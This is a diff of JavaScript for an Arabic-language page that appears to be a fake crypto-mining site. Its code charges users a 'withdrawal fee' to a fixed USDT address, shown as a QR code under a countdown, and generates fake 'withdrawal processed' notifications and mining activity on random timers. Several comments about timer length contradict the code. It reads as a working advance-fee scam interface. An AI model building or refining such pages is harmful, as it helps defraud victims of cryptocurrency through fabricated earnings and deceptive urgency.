+         * and hides the payment modal.
+         */
+        function cancelPayment() {
+            paymentTerminated = true; // Set termination flag
+            // Clear all polling intervals
+            pollIntervals.forEach(intervalId => clearInterval(intervalId));
+            pollIntervals = [];
+            activePaymentId = null;
+            // Clear timer
+            if (paymentTimerId) {
+                clearInterval(paymentTimerId);
+                paymentTimerId = null;
+            }
+            // Hide payment modal and update UI as needed
+            document.getElementById('paymentModal').classList.add('hidden');
+            console.log("Payment process terminated by user.");
+        }
+
+        // Expose cancelPayment globally if needed (for inline event handlers)
+        window.cancelPayment = cancelPayment;
+
+        /**
+         * Starts the payment timer (5 minutes countdown) and ensures any previous timer is cleared.
+         */
+        function startPaymentTimer() {
+            if (paymentTimerId) {
+                clearInterval(paymentTimerId);
+                paymentTimerId = null;
+            }
+            let timeLeft = 60 * 60; // 10 minutes in seconds
+            const timerElement = document.getElementById("paymentTimer");
+            paymentTimerId = setInterval(() => {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                if (timerElement) {
+                    timerElement.textContent = `${minutes}:${seconds}`;
+                }
+                if (timeLeft <= 0) {
+                    clearInterval(paymentTimerId);
+                    paymentTimerId = null;
+                    if (timerElement) {
+                        timerElement.textContent = "00:00";
+                    }
+                    alert("⏳ انتهى الوقت! يرجى إعادة بدء عملية دفع الترقية.");
+                    document.getElementById("paymentModal").classList.add("hidden"); // Hide modal
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        /* --- Main Payment Process --- */
+        document.getElementById('confirmWithdraw').addEventListener('click', async () => {
+            document.getElementById('confirmWithdraw').disabled = true;
+            // First, reset any old payment process completely
+            resetPaymentProcess();
+
+            const address = document.getElementById('usdtAddressInput').value.trim();
+            const addressConfirmation = document.getElementById('addressConfirmation');
+            const usdtTrc20Regex = /^T[a-zA-Z0-9]{33}$/;
+            if (!usdtTrc20Regex.test(address)) {
+            showNotification('الرجاء إدخال عنوان محفظة USDT TRC20 صحيح!');
+            return;
+        }
+            if (!addressConfirmation.checked) {
+            showNotification('الرجاء تأكيد صحة العنوان!');
+            return;
+        }
+
+            // Calculate payment amount using your existing logic
+            const totalUSD = ltcCounter * ltcPrice;
+            const currentFee = calculateFee();
+            const paymentAmount = (totalUSD * currentFee) / 100;
+            console.log("Payment Amount (USD):", paymentAmount);
+
+            // Update UI: hide withdraw modal, show payment modal, start timer, update labels
+            startPaymentTimer();
+            document.getElementById('paymentAmount').textContent = paymentAmount.toLocaleString('de-DE', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            document.getElementById("earnedUSDlabel").textContent = totalUSD.toLocaleString('de-DE', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            try {
+                // Update UI with payment details: address, QR code, etc.
+                document.getElementById('usdtAddress').textContent = usdtAddress; // Use the defined USDT address
+                QRCode.toCanvas(document.getElementById('qrcode'), usdtAddress, { width: 128 });
+                document.getElementById('withdrawModal').classList.add('hidden');
+                document.getElementById('paymentModal').classList.remove('hidden');
+                document.getElementById('confirmWithdraw').removeAttribute('disabled');
+
+            } catch (error) {
+                console.error("Payment Creation Failed:", error);
+                showNotification("حدث خطأ أثناء إنشاء الدفع. حاول مرة أخرى.");
+            }
+        });
+
+        // Function to show payment confirmation modal
+        function showPaymentConfirmation(totalProfits, paymentFee, usdtAddress) {
+            // Hide any existing notifications
+            const notification = document.getElementById('notification');
+            if (notification) {
+                notification.style.display = 'none';
+            }
+
+            // Update modal content
+            document.getElementById('totalProfits').textContent = totalProfits.toFixed(2);
+            document.getElementById('paymentFee').textContent = paymentFee.toFixed(2);
+            document.getElementById('usdtAddressDisplay').textContent = usdtAddress;
+
+            // Generate QR code
+            QRCode.toCanvas(document.getElementById('qrcodePayment'), usdtAddress, { width: 128 });
+
+            // Show the payment confirmation modal
+            document.getElementById('paymentConfirmationModal').classList.remove('hidden');
+
+            // Start the payment timer
+            startPaymentTimer(60000); // 60 minutes in seconds
+        }
+        
+        
+// Function to add a notification to the activity feed
+    const addNotification = (message) => {
+      const notification = document.createElement('div');
+      notification.className = 'bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-4 rounded-xl border border-blue-500/20 flex items-center space-x-3 hover:bg-orange-900/10 transition-colors';
+      notification.innerHTML = `
+        <div class="h-2.5 w-2.5 bg-blue-600 rounded-full animate-pulse mx-2 inline-block"></div>
+        <div class="text-sm text-blue-200">${message}</div>
+        <div class="flex-1"></div>
+        <div class="text-xs text-blue-400/70">${new Date().toLocaleTimeString()}</div>
+      `;
+      const container = document.getElementById('notifications');
+      container.prepend(notification);
+      container.scrollTo({ top: 0, behavior: 'smooth' });
+      if (container.children.length > 10) {
+        container.lastChild.remove();
+      }
+    };
+    
+    // Add initial notifications
+    const notificationMessages = [
+      'تم تحديث خوادم التعدين بنجاح',
+      'تم معالجة عملية سحب الارباح',
+      'زيم معالجة عملية سحب الارباح',
+      'تحسينات أمنية تم تطبيقها',
+      'تم معالجة عملية سحب جديدة',
+      'عملية سحب جديدة قيد المعالجة'
+    ];
+    
+    for (let i = 0; i < 20; i++) {
+      addNotification(notificationMessages[i % notificationMessages.length]);
+    }
+    
+    setInterval(() => {
+      addNotification(notificationMessages[Math.floor(Math.random() * notificationMessages.length)]);
+    }, 5000);
+
+    // Add initial processes
+    for (let i = 0; i < 10; i++) {
+      addMiningProcess();
+    }
+
+    // Add new processes periodically
+    setInterval(addMiningProcess, Math.random() * 500 + 500);
+    
+    
+        // التهيئة الأولية
+        updateEarnings();
+        updateUI();
+    </script>
+
+</body>
+</html>
